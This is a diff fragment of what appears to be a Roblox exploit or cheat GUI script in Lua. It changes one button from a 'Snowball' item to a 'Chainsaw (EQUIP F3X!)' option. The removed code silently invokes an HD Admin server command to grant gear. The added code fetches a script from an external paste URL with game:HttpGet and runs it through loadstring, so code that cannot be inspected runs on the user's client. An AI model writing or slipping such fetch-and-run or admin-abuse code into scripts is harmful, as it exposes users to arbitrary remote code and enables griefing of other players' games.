@@ -15549,14 +15549,10 @@ button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Snowball"
+button.Text = "Chainsaw (EQUIP F3X!)"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
-
-	RequestCommand:InvokeServer(";gear me 19328185")
-
+	loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/IIPoIWa14yVk8Fet/raw",true))()
 end)
 
 local button = Instance.new("TextButton")
